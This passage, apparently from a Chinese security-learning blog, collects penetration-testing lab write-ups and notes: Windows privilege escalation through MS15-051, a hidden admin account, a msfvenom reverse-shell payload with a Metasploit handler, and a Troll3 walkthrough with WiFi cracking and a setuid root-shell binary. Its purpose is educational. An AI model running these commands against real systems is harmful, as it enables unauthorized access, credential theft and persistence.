alt="image-20240521213257467"></p><p>进入命令界面</p><pre><code>systeminfo</code></pre><p><img src="/../image/image-20240521213446704.png" alt="image-20240521213446704"></p><p>利用补丁号更具操作系统类型，查找exp，究竟哪一个有用，要我们一个一个去试</p><h3 id="MS15-051-KB3045171"><a href="#MS15-051-KB3045171" class="headerlink" title="MS15-051-KB3045171"></a>MS15-051-KB3045171</h3><p>在文件里右键上传即可</p><p><img src="/../image/image-20240521213819003.png" alt="image-20240521213819003"></p><p>最好重命名一下，方便利用</p><pre><code>abc.exe whami</code></pre><p><img src="/../image/image-20240521214025522.png" alt="image-20240521214025522"></p><p>这时候就是系统权限的用户了，添加用户进入管理组,后续就可以利用这个用户进行渗透，也有一种隐藏用户，不容易被发现</p><p><a href="https://blog.csdn.net/weixin_40412037/article/details/123478562">https://blog.csdn.net/weixin_40412037/article/details/123478562</a></p><pre><code>abc.exe net user a a.1 /add#添加用户net localgroup administrators a /add  #添加用户至管理组</code></pre><h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>上传一个属于meterpreter的木马</p><pre><code>先拿一个msf的session，另开一个msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.174.137 lport=1234 -f exe  &gt; shell.exe </code></pre><p>OS&#x2F;几位&#x2F;后渗透模块的反弹shell&#x2F;监听地址和端口，文件类型</p><p>进入meterpreter加载exe</p><pre><code>meterpreter &gt; upload shell.exe[*] Uploading  : /root/shell.exe -&gt; shell.exe[*] Uploaded -1.00 B of 203.50 KiB (-0.0%): /root/shell.exe -&gt; shell.exe[*] Completed  : /root/shell.exe -&gt; shell.exemeterpreter &gt; ls shell.exe100777/rwxrwxrwx  895002465218048  fil  233592092020-04-06 21:40:02 +0800  shell.exe#rwx有可执行权限</code></pre><p>新开一个监听</p><pre><code>msfconsole#不用默认的payload，去复制木马的payloadmsf6 &gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter_reverse_tcppayload =&gt; windows/x64/meterpreter_reverse_tcp#option设置一下msf6 exploit(multi/handler) &gt; set LHOST 192.168.174.137LHOST =&gt; 192.168.174.137msf6 exploit(multi/handler) &gt; set LPORT 1234LPORT =&gt; 1234</code></pre><p>meterpreter</p><pre><code>meterpreter &gt; execute -f shell.exeProcess 1368 created.</code></pre><p>获得shell后</p><pre><code>meterpreter &gt; hashdump[-] priv_passwd_get_sam_hashes: Operation failed: 1168</code></pre><p>这里报错是权限不够，而不是没有这个命令</p><h3 id="msf提权模块"><a href="#msf提权模块" class="headerlink" title="msf提权模块"></a>msf提权模块</h3><pre><code>#use post/multi/recon/local_exploit_suggester#Msf里能够提权的模块还有很多如use exploit/windows/local/ms16_016_webdav （可能需要使用migrate迁移一下进程）#先把会话放在后台meterpreter &gt; background[*] Backgrounding session 16...use post/multi/recon/local_exploit_suggesteroptions设置下会话，可以用sessions命令查看</code></pre><p>这个会返回很多的可用payload，需要一个一个测试</p>]]></content>
      
      
      
        <tags>
            
            <tag> msf </tag>
            
            <tag> ms17_010 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些读书笔记</title>
      <link href="/2024/05/19/%E4%B8%80%E4%BA%9B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/05/19/%E4%B8%80%E4%BA%9B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="读书笔记"><a href="#读书笔记" class="headerlink" title="读书笔记"></a>读书笔记</h1><p>主要是记录一些常识</p><h2 id="msf篇"><a href="#msf篇" class="headerlink" title="msf篇"></a>msf篇</h2><p><strong>渗透测试</strong>：是一种通过模拟恶意攻击者的技术与方法，挫败目标系统安全控制措施，取得访问控制权，并发现具备业务影响后果安全隐患的一种安全测试与评估方式。</p><p>渗透测试的<strong>分类</strong>:黑盒和白盒、灰盒（白+黑）</p><p>一定的测试流程：</p><ol><li>安全测试方法学开源手册</li><li>NIST SP 800-42网络安全测试指南</li><li>OWASP top 10</li><li>Web安全威胁分类标准</li><li>PTES</li></ol><p>着重记一下PTES，认同度比较高</p><p><strong>七个阶段</strong>：前期交互、情报搜集、威胁建模（团队brain storm）、漏洞分析、渗透攻击、后渗透攻击、报告</p><p><strong>安全漏洞的生命周期</strong>：</p><pre><code>1. 研究与发掘1. exp开发与测试1. 漏洞和exp在封闭团队中流传1. 扩散开了1. 恶意程序出现开始传播1. 大规模传播并危害互联网1. 逐渐消亡</code></pre><p><img src="/../image/image-20240519203316672.png" alt="image-20240519203316672"></p><p>​也就是我们说的0day，1day之类的</p><p><strong>0day：</strong>从发现到补丁，传播一段时间后就是1day了</p><p><strong>漏洞也有买卖、地下经济链，No more free bug</strong></p><p><strong>安全漏洞公共资源库</strong>：</p><ol><li>CNNVD 中国国家漏洞库</li><li>CNVD 中国国家信息安全漏洞共享平台</li><li>乌云（民间组织）</li><li>SCAP</li><li>CVE 通用漏洞与披露</li><li>NVD 国家漏洞数据库（美）</li><li>securityfocus</li><li>OSVDB msf作者发起的</li></ol><p><strong>渗透攻击的代码获取</strong></p><p>msf应该就是最好的了，但也有其它的，付费或者免费的都有1337day就是付费的</p><p><img src="/../image/image-20240519203914970.png" alt="image-20240519203914970"></p><p><strong>好多插件：</strong></p><p>Nessus、OpenVAS、SET、FAast Track、Karmetasploit等</p><p>Nessus 是一款广泛使用的网络<a href="https://so.csdn.net/so/search?q=%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7&spm=1001.2101.3001.7020">漏洞扫描工具</a>。它由 Tenable Network Security 公司开发，旨在帮助组织评估其计算机系统和网络的安全性。</p><p>OpenVas是一款开源的漏洞扫描工具，是Nessus项目分支，检测目标网络或主机的安全性。现基于B&#x2F;S(浏览器&#x2F;服务器)架构进行工作，执行扫描并提供扫描结果。</p><p> Kali–social engineering toolkit（SET）<a href="https://blog.csdn.net/m0_68012373/article/details/125564443">https://blog.csdn.net/m0_68012373/article/details/125564443</a></p><p>Fast-Track是Backtrack工具里面自带的渗透工具，在现代的渗透测试过程中体现出了她所拥有的强大的威力，同时也对安全人员带来了很大的压力。</p><p><img src="/../image/image-20240519205417745.png" alt="image-20240519205417745">ss</p><p>基础库：RRex fw-core、fw-base</p><p>四个模块：aux、exp、payload、post、encoders</p><p>SCADA工业控制系统服务渗透攻击</p><p><strong>主动渗透攻击</strong>所利用的安全漏洞位于网络服务端软件与服务承载的上层应用程序之中，</p><p><strong>被动渗透攻击</strong>利用的安全漏洞位于客户端软件中，如浏览器、浏览器插件、电子邮件客户端、Office与Adobe等各种文档阅读与编辑软件。</p><p><strong>保护机制</strong>：Windows7等新型操作系统所引人的NX(堆栈不可执行)、DEP(数据执行保护)，可以通过控制payload绕过</p><p>空指令：在x86CPU体系架构平台上的操作码是 0x90.在渗透攻击构造邪恶数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令区，这样当触发渗透攻击后跳转执行Shellcode 时，有一个较大的安全着陆区，从而避免受到内存地址随机化、返回地址计算偏差等原因造成的Shellcode执行失败，提高渗透攻击的可靠性。Metasploit框架中的空指令模块就是用来在攻击载荷中添加空指令区，以提高攻击可靠性的组件。</p><p><strong>编码器模块</strong>的第一个使命是确保攻击载荷中不会出现渗透攻击过程中应加以避免的“坏字符”，这些“坏字符”的存在将导致特殊构造的邪恶数据缓冲区无法按照预期目标完成，典型的就是0x00</p><p>第二个就是免杀</p><h1 id="Linux之Xinetd服务介绍"><a href="#Linux之Xinetd服务介绍" class="headerlink" title="Linux之Xinetd服务介绍"></a><a href="https://blog.csdn.net/lzghxjt/article/details/83018710">Linux之Xinetd服务介绍</a></h1>]]></content>
      
      
      
        <tags>
            
            <tag> note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali+docker+vulhub</title>
      <link href="/2024/04/28/kali-docker-vulhub/"/>
      <url>/2024/04/28/kali-docker-vulhub/</url>
      
        <content type="html"><![CDATA[<h1 id="vulhub环境搭建"><a href="#vulhub环境搭建" class="headerlink" title="vulhub环境搭建"></a><a href="https://www.freebuf.com/vuls/282626.html">vulhub环境搭建</a></h1><h2 id="安装证书环境"><a href="#安装证书环境" class="headerlink" title="安装证书环境"></a>安装证书环境</h2><pre><code class="bash">#记得配下源 编辑 /etc/apt/source.listapt-update#安装https和ca证书apt-get install -y apt-transport-https ca-certificates#dirmngrapt-get install dirmngr</code></pre><p>补充知s识<a href="https://docs.oracle.com/cd/E75432_01/html/E72378/dirmngr-8.html">dirmngr</a></p><h2 id="添加GPG密钥并添加更新源"><a href="#添加GPG密钥并添加更新源" class="headerlink" title="添加GPG密钥并添加更新源"></a>添加GPG密钥并添加更新源</h2><p>获取指定URL的GPG（GNU Privacy Guard）密钥，并使用<code>apt-key</code>命令将其添加到密钥环中。</p><pre><code>curl -fsSL https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/gpg | sudo apt-key add -</code></pre><ul><li><code>curl</code>：这是一个命令行工具，用于使用各种支持的协议从服务器传输数据。</li><li><code>-fsSL</code>:这些是传递给curl的命令的选项：<ul><li><code>-f</code>：它告诉<code>curl</code>在请求失败时静默失败，不生成任何输出。</li><li><code>-s</code>：它使<code>curl</code>以静默模式运行，不显示任何进度或错误消息。</li><li><code>-S</code>：如果发生错误，它强制<code>curl</code>显示错误消息。</li><li><code>-L</code>：它指示<code>curl</code>在服务器响应重定向时跟随重定向。</li></ul></li><li><code>https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/gpg</code>：这是要获取的GPG密钥的URL。在这种情况下，它是清华大学镜像上托管的Docker CE（Community Edition）仓库的GPG密钥文件的URL。</li><li><code>sudo apt-key add -</code>：此命令将从<code>curl</code>接收到的GPG密钥添加到系统的密钥环中。末尾的<code>-</code>表示从标准输入读取GPG密钥。</li></ul><p><img src="/../image/image-20240428234738195.png" alt="image-20240428234738195"></p><p>将指定的软件源行添加到<code>/etc/apt/sources.list.d/docker.list</code>文件中</p><pre><code>echo &#39;deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable&#39; | sudo tee /etc/apt/sources.list.d/docker.list</code></pre><p>让我们逐个解释命令及其组成部分：</p><ul><li><code>echo</code>: 这是一个命令，用于将参数中的文本内容输出到标准输出（终端）。</li><li><code>&#39;deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable&#39;</code>: 这是要输出的文本内容，它是一个代表软件源的行。在这个例子中，它指定了一个名为”buster”的Debian发行版中的Docker CE软件源，使用的是清华大学镜像站提供的URL。</li><li><code>tee</code>: 这是一个命令，它接收标准输入并将其内容写入一个或多个文件中。</li><li><code>/etc/apt/sources.list.d/docker.list</code>: 这是要写入的文件路径，它位于<code>/etc/apt/sources.list.d/</code>目录下，用于存储软件源的配置文件。</li></ul><p>通过执行这个命令，您将使用<code>echo</code>命令输出指定的软件源行，然后通过管道将其传递给<code>sudo tee</code>命令。<code>tee</code>命令以<code>sudo</code>权限将输入的内容写入<code>/etc/apt/sources.list.d/docker.list</code>文件中，这样就添加了一个新的软件源配置。</p><h2 id="系统更新以及安装docker"><a href="#系统更新以及安装docker" class="headerlink" title="系统更新以及安装docker"></a>系统更新以及安装docker</h2><pre><code class="bash">#因为更新了证书和源记得再更新一次apt-get update#安装docker-ceapt install docker-ce</code></pre><h3 id="启动docker服务器"><a href="#启动docker服务器" class="headerlink" title="启动docker服务器"></a>启动docker服务器</h3><pre><code class="bash">service docker start</code></pre><h3 id="安装compose"><a href="#安装compose" class="headerlink" title="安装compose"></a>安装compose</h3><pre><code class="bash">apt install docker-compose</code></pre><h3 id="docker安装测试"><a href="#docker安装测试" class="headerlink" title="docker安装测试"></a>docker安装测试</h3><pre><code class="bash">docker version    #查看docker的版本信息docker images   #查看拥有的imagesdocker ps    #查看docker container</code></pre><h3 id="配置镜像加速aliyun"><a href="#配置镜像加速aliyun" class="headerlink" title="配置镜像加速aliyun"></a>配置镜像加速aliyun</h3><pre><code>sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json &lt;&lt;-&#39;EOF&#39;&#123;  &quot;registry-mirrors&quot;: [&quot;https://xxx.mirror.aliyuncs.com&quot;]&#125;EOFsudo systemctl daemon-reloadsudo systemctl restart docker</code></pre><p>在aliyun的容器镜像服务里找到镜像工具点进镜像加速器</p><p>到这里就结束了</p><h2 id="Docker安装sqli-labs"><a href="#Docker安装sqli-labs" class="headerlink" title="Docker安装sqli-labs"></a>Docker安装sqli-labs</h2><p>练习用docker安装sqli-labs</p><pre><code>docker search     sqli-labs  查找sqli-labs镜像docker pull     acgpiano/sqli-labs  拉取镜像到本地docker images  查看已有的镜像docker run -dt --name sqli -p     80:80 --rm acgpiano/sqli-labs-dt  让其在后台运行--name  给其命名-p  本地端口：docker中的端口是将docker的端口映射到本地端口--rm  当其关闭后将删除开启的资源docker ps -a 显示容器container容器的id image 命令 端口等信息docker exec -it （id号）     /bin/bash  进入id号的shell</code></pre><h2 id="Docker的基本使用"><a href="#Docker的基本使用" class="headerlink" title="Docker的基本使用"></a>Docker的基本使用</h2><pre><code>docker images    查看存在的镜像docker image rm &lt;id&gt;    删除镜像docker run -dt --name sqli -p 80:80 --rm acgpiano/sqli-labs    运行存在的镜像docker exec -it &lt;container ID&gt; /bin/bash    进入运行中的容器docker run -it --rm ubuntu /bin/bash    运行存在的镜像，并以交互的方式进入容器，运行完删除容器docker ps    docker container ls    查看运行中的容器docker stop &lt;container ID&gt;    停止指定的容器，不指定为停止所有容器docker rm    删除所有的容器docker container [stop/start/restart]    停止/开启/重启容器docker container kall &lt;container ID&gt;    强制停止容器docker commit -p &lt;container ID&gt; container-backup    创建Docker的快照把宿主机文件拷到容器里面docker cp 要拷贝的文件路径 容器名: 要拷贝到容器里面对应的路径容器里面拷文件到主机docker cp 容器名: 要拷贝的文件在容器中的路径 要拷贝到宿主机器的响应路径</code></pre><h2 id="安装vulhub"><a href="#安装vulhub" class="headerlink" title="安装vulhub"></a>安装vulhub</h2><pre><code>#记得选好安装路径git clone https://github.com/vulhub/vulhub.git</code></pre><p>下载好后，进入目录</p><pre><code>cd vulhub</code></pre><p>拉取漏洞环境，比如struts2</p><pre><code>cd struts2</code></pre><p>举例S2-001</p><pre><code>cd s2-001</code></pre><p>然后执行命令，开启struts2-001漏洞</p><pre><code>docker-compose up -dsudo docker ps    查看运行中的容器环境</code></pre><p>访问漏洞环境</p><p>访问 ip地址:8080</p><p>注意：如果没有回显可以加一些参数比如index</p><pre><code>docker stop （id号）</code></pre><p>如果想要再次执行，可以输入</p><pre><code>docker run -d -p 8080:8080 medicean/vulapps:s_struts2_s2-001</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCP-003-Troll</title>
      <link href="/2024/04/28/OSCP-003-Troll/"/>
      <url>/2024/04/28/OSCP-003-Troll/</url>
      
        <content type="html"><![CDATA[<p><strong>kali：192.138.174.137</strong></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><pre><code>nmap -sn 192.168.174.0/24或arp-scan -l或netdiscover -i eht0#比较慢</code></pre><p>发现目标主机：<strong>192.168.174.156</strong></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre><code>nmap -A -p- 192.168.174.156</code></pre><p><img src="/../image/image-20240428225714640.png" alt="image-20240428225714640"></p><p>只开放了22端口，昨天刚做完ssh敲门，试了下没什么提示，去搜别人的wp，发现它们能扫出来3个端口，嗯？，是我配置环境有问题吗。试试下面这个命令</p><pre><code>nmap -p22 --script &quot;default or safe&quot; 192.168.174.156</code></pre><ol><li>“default”脚本：这个脚本是nmap的默认脚本之一，用于执行一系列常规的端口扫描和服务探测。如开放的端口、运行的服务和版本等。</li><li>“safe”脚本：这个脚本也是nmap的内置脚本之一，它执行一些安全性相关的扫描任务。它会检查目标主机是否存在已知的安全漏洞、弱密码、常见的网络配置错误等。</li></ol><p>扫描完也没有发现什么信息，点开之前打卡的靶机，发现</p><pre><code>Are you sure you want to do this? Login: start :here</code></pre><p>试着登陆一下，发现真登上去了。。。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>登陆上shell后，id查看权限,ls -a看当前目录有什么文件</p><pre><code>start@Tr0ll3:~$ lsbluepill  redpillstart@Tr0ll3:~$ iduid=1001(start) gid=1001(start) groups=1001(start)</code></pre><p>找到了两个文件，分别看看里面的内容,里面各有一个文件</p><pre><code class="bash">#为了安全，先看看文件类型file file_awesome_workfile this_weill_surely_work</code></pre><ul><li>-b 　列出辨识结果时，不显示文件名称。</li><li>-c 　详细显示指令执行过程，便于排错或分析程序执行的情形。</li><li>-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。</li><li>-L 　直接显示符号连接所指向的文件的类别。</li><li>-m&lt;魔法数字文件&gt; 　指定魔法数字文件。</li><li>-v 　显示版本信息。</li><li>-z 　尝试去解读压缩文件的内容。</li><li>[文件或目录…] 要确定类型的文件列表，多个文件之间使用空格分开，可以使用shell通配符匹配多个文件。</li></ul><p>再分别看两个文件的内容</p><pre><code class="bash">#cat filenamestart@Tr0ll3:~$ cat bluepill/awesome_work http://bfy.tw/ODastart@Tr0ll3:~$ cat redpill/this_will_surely_work step2:Password1!</code></pre><p>一个是网址，一个看起来像是账号密码</p><p>这里有个知识点</p><h3 id="短链接还原"><a href="#短链接还原" class="headerlink" title="短链接还原"></a>短链接还原</h3><p>找了下，一些在线网站都挂了，但发现curl可以直接返回</p><pre><code>curl -IL 链接 https://www.lmgtfy.app/?q=how+do+you+make+a+hacker+waste+time%3F</code></pre><p>说是在浪费时间，估计正确的步骤是登陆另一个账户</p><pre><code>ssh step2@192.168.174.156</code></pre><p>密码输入，却说没有权限，试试在start那里提权试试</p><pre><code>find / -type f -perm 0777 2&gt;/dev/null</code></pre><ol><li><code>-type f</code>：该选项指定只搜索文件，而不搜索目录或其他类型的文件（如符号链接）。</li><li><code>-perm 0777</code>：该选项指定要搜索的文件的权限。在这种情况下，它查找权限设置为0777的文件。权限值0777表示具有读取、写入和执行权限的文件。</li></ol><p>找到两个结果</p><pre><code>/var/log/.dist-manage/wytshadow.cap/.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt</code></pre><p>这些目录构成了一句话，且hint是线索，看下那个txt文件里有什么信息</p><p>看起来像个密码字典，而第一个文件是一个数据包文件，我们先把他们复制到自己本机当前目录</p><pre><code>#在本机kali执行以下两条命令scp 192.168.56.152:/var/log/.dist-manage/wytshadow.cap .scp start@192.168.56.152:/.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt .</code></pre><h3 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h3><ul><li><strong>-n</strong> 禁止IP名称解析。</li><li><strong>-nn</strong> 禁止IP和端口名称解析。</li><li><strong>-i</strong> 指定捕获哪个网卡的网络数据包。</li><li><strong>-w</strong> 指定将包写入哪个文件，如果文件不存在则创建该文件；如果存在则覆盖其内容。</li><li><strong>-f</strong> 指定过滤表达式，例如指定捕获哪个端口，哪个协议等。</li><li><strong>-r</strong> 指定从哪个文件读取网络数据包文件。</li><li><strong>-F</strong> 指定使用哪个文件的过滤表达式抓包。</li><li><strong>-D</strong> 列出所有可以使用tcpdump抓包的网卡。</li><li><strong>-c</strong> 指定捕获或者读取包的个数，**-c**后面直接接数字即可。</li><li><strong>-l</strong> 抓包时保存到文件的同时查看包的内容。</li><li><strong>-t</strong> 不打印时间戳。</li><li><strong>-tt</strong> 秒级时间戳。</li><li><strong>-ttt</strong> 打印时间戳到微秒或者纳秒，取决于 <strong>–time-stamp-precision option</strong> 选项。</li><li><strong>-s</strong> 指定每个包捕获的字节数。</li><li><strong>-S</strong> 打印绝对的tcp序列号，而不是相对的序列号。</li><li><strong>-v&#x2F;-vv&#x2F;-vvv</strong> 打印详细信息，v的个数越多， 打印内容越详细。</li></ul><p>然后我们可以用这个命令来查看数据包的内容</p><pre><code>tcpdump -nnttttAr wytshadow.cap | less -Sr</code></pre><ul><li><code>tcpdump</code>：这是用于网络流量捕获和分析的命令行工具。</li><li><code>-n</code>：此选项告诉 tcpdump 不要将 IP 地址解析为主机名，而是显示 IP 地址。</li><li><code>-ntttt</code>：这些选项修改 tcpdump 的输出格式，使其显示更多的时间戳信息。每个 <code>t</code> 表示增加一个时间戳字段，总共有 5 个 <code>t</code>，表示显示五个时间戳字段。</li><li><code>-Ar wytshadow.cap</code>：这部分指定要分析的捕获文件名为 <code>wytshadow.cap</code>。<code>-A</code> 选项表示以 ASCII 文本形式显示数据包内容，而不是以十六进制显示。</li><li><code>less -Sr</code>：<code>less</code> 是一个分页浏览器，用于查看长文本输出。<code>-S</code> 选项告诉 <code>less</code> 在折行时不折断长行，而是横向滚动显示内容。</li></ul><p>发现是<strong>802.11协议</strong>，是wifi的协议，可能是wifi密码，可以用aircrack破解</p><p>scp完后这两个文件就被考到自己的目录下了，然后用txt作为字典，去破解cap包里的密码</p><pre><code>aircrack-ng -w gold_star.txt wytshadow.cap</code></pre><p>经过漫长的等待，发现密码</p><pre><code>wytshadow:gaUoCe34t1</code></pre><p>去连接以下这个用户</p><pre><code>ssh sytshadow@192.168.174.156</code></pre><p>然后发现目录下有个oohfun文件，file一下发现是ELF文件，linux下的可执行文件，执行以下一直打印，Lynx 是一个文本模式的 Web 浏览器，线索说明可能和浏览器相关</p><pre><code>iM Cr@zY L1k3 AAA LYNX</code></pre><p>让我们试试sudo -l看下有什么我们（执行 sudo 的使用者）的权限</p><pre><code>sudo -l输入密码后env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser wytshadow may run the following commands on Tr0ll3:    (root) /usr/sbin/service nginx start</code></pre><p>这说明我们有可能启动nginx，sites-enabled 目录中存放的是链接文件，每个链接文件都指向 sites-available 目录中的配置文件，表示需要让 Nginx 启用哪些配置代理文件。</p><pre><code>cd /etc/nginx/site-enablecat default</code></pre><p>看下网页有什么信息</p><pre><code>server &#123;        listen 8080 default_server;        listen [::]:8080 default_server;                if ($http_user_agent !~ &quot;Lynx*&quot;)&#123;    return 403;&#125; root /var/nginx/www;</code></pre><p>这里有两个信息，我们不妨先根据前面的lynx的线索，去看看8080端口有什么提示</p><pre><code>netstat -antp#列出所有当前系统上的 TCP 连接，并显示每个连接的本地地址、外部地址、状态以及关联的进程信息</code></pre><p>发现没有相关信息，可能是服务没启动，我们启动下nginx服务</p><pre><code>sudo start service nginxs</code></pre><p>再看看就可以发现有相关连接了，新建一个terminal，去看看这个服务的具体信息，结合前面的lynx说明我们可以利用这个命令访问一下这个网页</p><pre><code>lynx 192.168.174.156:8080</code></pre><p>得到一个新的账号</p><pre><code>genphlux:HF9nd0cR!  </code></pre><p>继续ssh连接，感觉就是一个ssh的无线套娃</p><pre><code>genphlux@Tr0ll3:~$ file maleus maleus: PEM RSA private keygenphlux@Tr0ll3:~$ file xlogin xlogin: HTML document, ASCII text</code></pre><p>一个RSA私钥和一个什么login文件，前面那个文件里就是正常的密钥，而xlogin文件里面好像是一个网页</p><pre><code class="html">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;&lt;html&gt; &lt;head&gt;  &lt;title&gt;Index of /xlogin&lt;/title&gt; &lt;/head&gt; &lt;body&gt;&lt;h1&gt;Index of /xlogin&lt;/h1&gt;  &lt;table&gt;   &lt;tr&gt;&lt;th valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/blank.gif&quot; alt=&quot;[ICO]&quot;&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=N;O=D&quot;&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=M;O=A&quot;&gt;Last modified&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=S;O=A&quot;&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=D;O=A&quot;&gt;Description&lt;/a&gt;&lt;/th&gt;&lt;/tr&gt;   &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/back.gif&quot; alt=&quot;[PARENTDIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;/&quot;&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;maleus&quot;&gt;maleus&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2015-06-18 00:27  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;1.6K&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;   &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;&lt;/table&gt;&lt;address&gt;Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 80&lt;/address&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>都先保存到本地去看看,网页打开也是下载maleus文件，所以关键还是那个密钥文件，猜测用户名可能就是文件名</p><pre><code>vim sshkeychmod 600ssh maleus@192.168.174.156 -i sshkey#学到了，用私钥登陆ssh</code></pre><p>成功登陆，发现当前目录又是一个dont_even_bother的elf文件，执行以下说要输入密码，这时候又是神之一手</p><h3 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h3><pre><code>strings dont_even_bother</code></pre><p>strings 命令用于扫描二进制文件（如可执行文件、共享库、目标文件等），并提取其中的可打印字符串。这些字符串可能是程序中的文本、错误消息、调试信息、配置参数等。使用 strings 命令可以帮助分析二进制文件，查找其中的文本内容或敏感信息。</p><p>学到了</p><pre><code>xl8Fpx%6 Correct Password  Your reward is just knowing you did it! :-P </code></pre><p>然后我们ll以下，会发现多了个文件.viminfo，cat一下内容可以发现maleus的密码</p><pre><code>B^slc8I$</code></pre><p>sudo -l查看自己可用的权限</p><pre><code>Matching Defaults entries for maleus on Tr0ll3:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser maleus may run the following commands on Tr0ll3:    (root) /home/maleus/dont_even_bother</code></pre><p>提示我们通过个elf文件达到root权限，也快拿到了Tr0ll3的权限了，怎么做呢,我们可以删除这个文件，重新新建一个c文件，返回root的bash</p><pre><code class="bash">rm  /home/maleus/dont_even_bothervim /home/maleus/dont_even_bother</code></pre><p>然后输入一下代码</p><pre><code class="c">int main(void) &#123;        setgid(9);        setuid(0);        execl(&quot;/bin/sh&quot;,&quot;sh&quot;,0);&#125;gcc dont_even_bother.c -dont_even_bother</code></pre><p>因为maleus对这个文件具有root权限，所以可以通过修改这个文件，让他调用系统函数来达到提升权限的目的，然后就是去root目录下找flag了。</p><pre><code>You are truly a Jedi!Twitter Proof:Pr00fThatTh3L33tHax0rG0tTheFl@g!!@Maleus21</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> OSCP </tag>
            
            <tag> 短链接还原 </tag>
            
            <tag> tcpdump </tag>
            
            <tag> strings </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Load Of The Root</title>
      <link href="/2024/04/26/Load-Of-The-Root/"/>
      <url>/2024/04/26/Load-Of-The-Root/</url>
      
        <content type="html"><![CDATA[<h1 id="Load-Of-The-Root参考"><a href="#Load-Of-The-Root参考" class="headerlink" title="Load Of The Root参考"></a>Load Of The Root<a href="https://blog.csdn.net/shenyu_1126/article/details/109744016">参考</a></h1><p>kali：192.168.174.137</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p><strong>nmap -sn 192.168.174.0&#x2F;24</strong></p><p><img src="/../image/image-20240426141555420.png" alt="image-20240426141555420"></p><p><strong>获得目标地址：192.168.174.151</strong></p><p>再次复盘时，不知道为什么nmap扫不到了，但用arp-sacn -l确找的得到，去搜了下区别又学到了一些<a href="https://blog.csdn.net/qq_63442530/article/details/137023387">扫描方法</a></p><pre><code class="bash">for i in &#123;1..254&#125;; do ping -c 1 -w 0.1 192.168.174.$i|grep from; done</code></pre><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><strong>nmap -sS -A -n 192.168.174.151</strong></p><ul><li><code>-sS</code>: 这个参数指定使用TCP SYN扫描（半开放扫描）</li><li><code>-A</code>: 